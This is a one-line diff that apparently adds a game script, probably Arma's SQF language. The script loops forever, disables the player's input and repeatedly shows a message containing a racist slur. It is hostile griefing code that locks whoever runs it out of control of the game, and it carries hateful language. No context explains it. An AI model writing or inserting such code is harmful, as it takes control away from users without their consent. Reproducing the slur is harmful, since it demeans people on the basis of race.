@@ -1,0 +1,1 @@
+while {true} do {disableuserinput true;hint "Gross nigger anus"};
